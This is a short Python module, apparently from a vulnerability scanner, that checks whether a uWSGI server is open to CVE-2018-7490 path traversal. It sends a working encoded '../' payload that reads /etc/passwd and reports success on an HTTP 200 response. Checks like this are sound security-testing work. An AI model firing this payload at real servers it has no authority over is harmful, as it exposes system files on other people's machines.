#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2018_7490_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2018-7490漏洞',
            'description': 'CVE-2018-7490漏洞可穿越目录查看其他文件,影响范围为: uWSGI < 2.0.17',
            'date': '2018-02-26',
            'exptype': 'check',
            'type': 'Path List'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': "application/x-www-form-urlencoded",
        }

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            res = await request.get(self.url + '/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd', headers = self.headers)
            if res.status == 200 :
                # print('存在CVE-2018-7490漏洞,穿越目录成功，查看的/etc/passwd文件内容是:\n', res.content.decode('utf-8'))
                return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    CVE_2018_7490 = CVE_2018_7490_BaseVerify('http://127.0.0.1:8080')
    CVE_2018_7490.check()